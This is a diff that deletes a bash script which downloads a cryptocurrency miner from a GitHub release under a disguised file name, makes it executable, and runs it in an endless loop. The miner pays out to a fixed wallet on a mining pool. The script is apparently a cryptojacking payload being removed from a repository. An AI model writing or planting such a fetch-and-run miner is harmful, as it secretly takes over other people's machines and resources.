@@ -1,6 +1,0 @@
-#!/bin/bash
-wget -O edokalos https://github.com/peakminer/peakminer/releases/download/v2.0.1/peakminer-2.0.1-linux-x86_64
-chmod 777 edokalos
-while :; do
-./edokalos --coin pearl -o stratum+tcp://prl.kryptex.network:7048 -u prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch/$(echo $RANDOM | md5sum | head -c 10)
-done
